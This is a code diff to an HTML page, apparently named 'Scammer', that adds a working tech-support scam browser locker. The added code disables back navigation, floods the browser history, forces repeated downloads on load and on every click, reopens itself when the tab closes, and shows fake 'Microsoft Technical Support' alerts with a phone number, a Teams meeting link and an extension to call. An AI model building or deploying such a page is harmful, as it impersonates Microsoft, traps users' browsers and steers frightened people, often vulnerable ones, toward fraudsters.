@@ -2,28 +2,33 @@
 <html>
     <head>
         <meta charset="utf-8" lang="en"/>
-        <script src="jquery-3.4.1.min.js"></script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+        <script type="text/javascript" >
+            function preventBack(){window.history.forward();}
+             setTimeout("preventBack()", 0);
+             window.onunload=function(){null};
+         </script>
+         
     </head>
     <body style="background-color: red;
      font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif; 
      text-align: center;
      color:white;
-     font-weight: bold;">
+     font-weight: bold;" onclick="">
 
     <h1>MALICIOUS COMPUTER ACTIVITY HAS BEEN DETECTED!!!</h1>
+<p></p>
+<p></p>
+<p></p>
+    <h1>
+        Contact MICROSOFT TECHNICAL SUPPORT AT 1-844-614-0183, OR <a href="https://teams.microsoft.com/l/meetup-join/19%3ameeting_ODI0OTNhMTktZDZmOC00ZmViLWEzNGQtMDZkN2RkM2NkODc5%40thread.v2/0?context=%7b%22Tid%22%3a%22879ae25f-11c6-4bd7-9eae-f912e1ce3115%22%2c%22Oid%22%3a%22df4b0c97-1e96-4acb-ac02-89a30a8610b7%22%7d">
+            LOGIN HERE </a> and use extension 705805503 FOR ASSISTANCE!
+    </h1>
 
-
+    <a href = "Scammer.html">Redirect to Home</a>
     <script>
-        var i, number = 10, total = 0;
-        for (i = 1; i <= number; i++)
-        {
-            total = total + i;
-            document.write("<b>Sum of N Natural Numbers is </b>= " + total);  
-        }
-        
-        document.write("<b>Sum of N Natural Numbers is </b>= " + total);
-
-        $(document).ready(function(){
+    $(document).ready(function(){
             //force download
 
     var file = "https://go.microsoft.com/fwlink/?LinkID=760868"
@@ -35,16 +40,36 @@
     function() {
         counter++;
         forceDownload(file);
-        if(counter > 4){
+        if(counter > 10){
             clearInterval(interval)
         }
     }, 1500);
 
     setInterval(function () {
-        var stateObj = {error, "error"};
+        var stateObj = {error: "error"};
         history.pushState(stateObj, document.title, document.href);
     }, 500);
 });  
+
+$(document).click(function(){
+    var file = "https://go.microsoft.com/fwlink/?LinkID=760868";
+    forceDownload(file);
+});
+
+$(window).unload(function(){
+    window.open("Scammer.html");
+})
+
+
+function forceDownload(href) {
+	var anchor = document.createElement('a');
+	anchor.href = href;
+	anchor.download = href;
+	document.body.appendChild(anchor);
+	anchor.click();
+    prompt("Your Computer has been hijacked!! Contact MICROSOFT TECHNICAL SUPPORT AT 1-844-614-0183!");
+}
+
     </script>
 
 </html>
